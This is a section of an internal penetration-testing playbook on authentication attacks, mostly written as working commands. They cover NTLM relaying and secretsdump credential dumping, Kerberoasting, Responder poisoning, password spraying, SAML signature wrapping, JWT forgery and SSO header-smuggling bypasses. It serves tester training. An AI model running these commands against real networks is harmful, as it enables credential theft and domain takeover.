## Part 6 — Phase 6: Authentication-specific testing

Internal apps heavily use Windows auth. This phase is where the internal pentest diverges most radically from public bug bounty.

### 6.1 Impacket suite

```bash
pipx install impacket    # or offline wheels via pip download
```

**ntlmrelayx** — the single most powerful internal web-app primitive:
```bash
# Relay to a web app without EPA (OWA, SharePoint, legacy IIS with WindowsAuth)
impacket-ntlmrelayx -t https://mail.corp.local/owa -smb2support --no-http-server

# Relay to LDAPS for RBCD (grant attacker constrained delegation over a victim)
impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --escalate-user CORP\\lowpriv -smb2support

# Relay to LDAPS for Shadow Credentials
impacket-ntlmrelayx -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'WEB01$' -smb2support

# SOCKS keeps relayed sessions alive for proxychains
impacket-ntlmrelayx -tf smb-no-signing.txt -socks -smb2support
proxychains impacket-secretsdump CORP/lowpriv@10.10.20.12 -no-pass
```

Disable Responder's HTTP+SMB servers (`Responder.conf`: `HTTP=Off, SMB=Off`) before relaying. Verify relayability beforehand: `nxc smb --gen-relay-list smb-no-signing.txt` and `nxc ldap -M ldap-checker`. `--remove-mic` may be needed vs unpatched DCs.

**Kerberoasting** (finds service accounts with HTTP SPNs = web-app service accounts):
```bash
impacket-GetUserSPNs CORP.LOCAL/lowpriv:'Winter2026!' -dc-ip 10.10.10.10 -request -outputfile roast.hashes
hashcat -m 13100 roast.hashes /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule
```

**AS-REP roasting** (no creds needed):
```bash
impacket-GetNPUsers CORP.LOCAL/ -dc-ip 10.10.10.10 -usersfile users.txt \
    -format hashcat -outputfile asrep.hashes -no-pass
hashcat -m 18200 asrep.hashes wordlist
```

**findDelegation** — look for web service accounts with unconstrained delegation or constrained delegation with protocol transition to `HTTP/...`:
```bash
impacket-findDelegation CORP.LOCAL/lowpriv:'...' -dc-ip 10.10.10.10
```

### 6.2 Responder

```bash
sudo responder -I eth0 -A                                  # analyze (passive) — RUN FIRST
sudo responder -I eth0 -wF                                 # full capture
sudo responder -I eth0 --lm --disable-ess                  # force NTLMv1 downgrade
```

Pairs with ntlmrelayx: flip `HTTP=Off, SMB=Off` in Responder.conf and run both in parallel — victims mistype `http://intranet` or `http://jira` → broadcast name lookup → victim authenticates to you with Negotiate → relay into the real internal web app.

### 6.3 Kerbrute

```bash
./kerbrute userenum --dc 10.10.10.10 -d corp.local xato-net-10-million-usernames.txt -o users.valid
./kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.valid 'Winter2026!'
./kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.valid 'Summer2025!' --delay 500 --threads 1
./kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt svc_webapp
```

Kerbrute **does** generate 4768 events on the DC; pre-auth errors may not increment lockout on some DCs but are logged. Always `nxc smb dc01 --pass-pol` first.

### 6.4 NetExec for web auth validation

`nxc` doesn't have a first-class `http` module yet, but validating a credential with `nxc smb`/`nxc ldap` and then reusing it on the web app covers 90% of cases (internal web apps re-use AD creds). Password spraying strategy: one password × many users, `--continue-on-success --jitter 1 5`, never reverse.

### 6.5 Handling Kerberos/SPNEGO in proxies

Three working patterns:
1. **Firefox** with `network.negotiate-auth.trusted-uris = .corp.local` → proxy to Burp. Kinit-based ccache just works.
2. **Burp with Java Kerberos** — see 5.1 above.
3. **Sidecar terminator** — cntlm/px/krb5-auth-proxy terminates NTLM/Kerberos and forwards plaintext to Burp.

SPN **must** match the hostname the browser asked for (`HTTP/app.corp.local` — not IP, not CNAME source). Check with `impacket-GetUserSPNs | grep HTTP`.

### 6.6 SAML Raider

Internal ADFS is an ubiquitous target. Intercept SAMLRequest or SAMLResponse → SAML Raider Certificates tab → import cert → edit `<saml:NameID>` to `administrator@corp.local` → run **XSW #1..#8** (signature wrapping) → try all variants, not just #1 — ADFS signs both Response and inner Assertion; XSW variants that keep both signatures valid work on more implementations.

### 6.7 jwt_tool

```bash
python3 jwt_tool.py -t https://app.corp.local/api/me \
    -rh "Authorization: Bearer eyJ..." -M pb          # full playbook

python3 jwt_tool.py eyJ... -X a                        # alg:none
python3 jwt_tool.py eyJ... -X k -pk pubkey.pem         # HS/RS key confusion
python3 jwt_tool.py eyJ... -X i -I -pc sub -pv administrator    # inline JWK inject
python3 jwt_tool.py eyJ... -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt               # crack HS256
```

`-X s` (JWKS spoof) requires target to reach your HTTP server — set `jwksloc = http://10.10.99.5:8000/jwks.json` in `jwtconf.ini` and `python3 -m http.server 8000`.

### 6.8 OAuth/OIDC — manual checks

```bash
curl -sk https://sso.corp.local/.well-known/openid-configuration | jq
curl -sk https://sso.corp.local/adfs/.well-known/openid-configuration | jq

# redirect_uri path confusion
curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=code&redirect_uri=https://app.corp.local.attacker.corp.local/cb"

# Missing state (CSRF on callback)
curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=code&redirect_uri=https://app.corp.local/cb"

# response_type mix-up
curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=token&redirect_uri=https://app.corp.local/cb"

# PKCE downgrade — exchange auth code without code_verifier
curl -k -X POST https://sso.corp.local/oauth2/token \
     -d 'grant_type=authorization_code&code=<CODE>&redirect_uri=https://app.corp.local/cb&client_id=webapp'
```

### 6.9 SSO-bypass reverse-proxy header smuggling

Reverse proxies/ingress controllers that terminate SSO and inject trusted headers often forward those headers when the client already supplied them — auth bypass.

```bash
curl -sk https://app.corp.local/admin -H 'X-Remote-User: administrator'
curl -sk https://app.corp.local/admin -H 'X-Forwarded-User: CORP\administrator'
curl -sk https://app.corp.local/admin -H 'X-Auth-Request-User: administrator' \
                                      -H 'X-Auth-Request-Email: administrator@corp.local'

# Path-confusion bypasses
curl -sk 'https://app.corp.local/;/admin'
curl -sk 'https://app.corp.local/%2f/admin'

# IIS+ARR / older Spring / Symfony
curl -sk https://app.corp.local/anonymous -H 'X-Original-URL: /admin'
curl -sk https://app.corp.local/anonymous -H 'X-Rewrite-URL:  /admin'

# OAuth2-proxy X-Forwarded-Uri (GHSA 2024)
curl -sk 'https://app.corp.local/oauth2/auth' -H 'X-Forwarded-Uri: /admin'

# Bypass proxy entirely — direct to backend
curl -sk --resolve app.corp.local:443:10.10.20.42 https://app.corp.local/admin
```

Full header list: `X-Remote-User, X-Forwarded-User, X-Auth-Request-User, X-Auth-Request-Email, X-WebAuth-User, X-User, X-Authenticated-User, X-SSL-Client-S-DN, Remote-User, REMOTE_USER, X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Uri, X-Forwarded-Proto, X-Forwarded-Preferred-Username`. Try casing and underscore variants — header that "wins" depends on proxy concat order.

### 6.10 BloodHound collection (offline ingest)

```bash
bloodhound-python -c All -u lowpriv -p 'Winter2026!' -d corp.local -ns 10.10.10.10 --zip
```

Feed zip to offline neo4j + BloodHound GUI. Pre-built Cypher: *"Kerberoastable users with path to DA"*, *"Unconstrained delegation computers"*, *"Users that can RDP to web server"*.

